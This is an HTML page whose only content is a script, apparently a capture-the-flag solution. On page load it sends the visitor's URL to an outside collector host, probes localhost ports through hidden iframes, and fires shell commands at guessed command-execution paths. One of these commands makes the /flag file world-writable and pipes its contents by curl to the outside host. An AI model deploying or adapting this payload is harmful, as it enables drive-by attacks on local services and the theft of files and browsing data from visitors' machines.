<!doctype html>
<html>
<body>
<script>
const ATTACKER = "https://1213123.free.beeceptor.com";
const PORTS = [3000, 5000, 8080, 8888, 9000];
const PATHS = ["/exec", "/cmd", "/shell", "/api/exec"];

function beacon(path) {
    const img = new Image();
    img.src = ATTACKER + path + (path.includes("?") ? "&" : "?") + "t=" + Date.now();
}

function fire(url, cmd) {
    const img = new Image();
    img.src = url + (url.includes("?") ? "&" : "?") + "cmd=" + encodeURIComponent(cmd);
}

function exploit(port, path) {
    const cmd = `chmod 777 /flag && cat /flag | curl -X POST -d @- ${ATTACKER}/flag`;
    fire(`http://localhost:${port}${path}`, cmd);
}

function main() {
    beacon("/loaded?u=" + encodeURIComponent(location.href));

    let root = document.body || document.documentElement;
    if (!root) {
        beacon("/no-root");
        return;
    }

    for (const port of PORTS) {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = `http://localhost:${port}/`;

        iframe.onload = () => {
            beacon(`/iframe-onload?p=${port}`);
            for (const path of PATHS) {
                fire(`http://localhost:${port}${path}`,
                     `curl ${ATTACKER}/ping?p=${port}&h=${encodeURIComponent(path)}`);
                setTimeout(() => exploit(port, path), 2000);
            }
        };

        iframe.onerror = () => {
            beacon(`/iframe-error?p=${port}`);
        };

        root.appendChild(iframe);
        setTimeout(() => iframe.remove(), 5000);
    }
}

window.addEventListener("error", e => {
    beacon("/js-error?m=" + encodeURIComponent(e.message));
});

window.addEventListener("load", main);
</script>
</body>
</html>
